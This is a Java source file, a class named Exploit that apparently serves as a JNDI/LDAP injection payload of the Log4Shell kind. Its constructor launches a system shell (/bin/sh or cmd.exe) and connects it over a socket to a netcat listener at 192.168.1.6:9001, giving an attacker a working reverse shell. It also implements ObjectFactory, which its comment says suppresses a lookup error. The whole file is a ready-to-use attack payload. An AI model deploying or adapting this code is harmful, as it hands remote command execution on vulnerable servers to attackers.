import javax.naming.Context;
import javax.naming.Name;
import javax.naming.spi.ObjectFactory;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.io.Serializable;
import java.net.Socket;
import java.util.Hashtable;

public class Exploit implements Serializable, ObjectFactory {
    private static final String OS = System.getProperty("os.name").toLowerCase();

    public Exploit() throws IOException, InterruptedException {
        //netcat listener
        String netcatHost = "192.168.1.6";
        int netcatPort = 9001;

        //default unix shell
        String cmd = "/bin/sh";

        if (OS.contains("win")) {
            cmd = "c:/windows/system32/cmd.exe";
        }

        Process shellProcess = new ProcessBuilder(cmd).redirectErrorStream(true).start();

        try (Socket socket = new Socket(netcatHost, netcatPort);
             InputStream shellInputStream = shellProcess.getInputStream();
             InputStream shellErrorStream = shellProcess.getErrorStream();
             InputStream socketInputStream = socket.getInputStream();
             OutputStream shellOutputStream = shellProcess.getOutputStream();
             OutputStream socketOutputStream = socket.getOutputStream()) {

            while (socket.isConnected()) {
                while (shellInputStream.available() > 0) {
                    socketOutputStream.write(shellInputStream.read());
                }
                while (shellErrorStream.available() > 0) {
                    socketOutputStream.write(shellErrorStream.read());
                }
                while (socketInputStream.available() > 0) {
                    shellOutputStream.write(socketInputStream.read());
                }

                socketOutputStream.flush();
                shellOutputStream.flush();

                Thread.sleep(50);
                try {
                    if (!shellProcess.isAlive()) {
                        shellProcess.exitValue();
                        System.out.println("shell exited");
                        break;
                    }
                } catch (Exception e) {
                    System.err.println(e.getMessage());
                }
            }
        } finally {
            shellProcess.destroy();
            System.out.println("exploit process finished");
        }
    }


    /**
     * To prevent the following warning
     * Error looking up JNDI resource [ldap://192.168.1.6:1389/Exlpoit]. javax.naming.NamingException:
     * problem generating object using object factory [Root exception is java.lang.ClassCastException:
     * Exploit cannot be cast to javax.naming.spi.ObjectFactory]; remaining name 'Exlpoit'
     */
    @Override
    public Object getObjectInstance(Object o, Name name, Context context, Hashtable<?, ?> hashtable) throws Exception {
        return null;
    }
}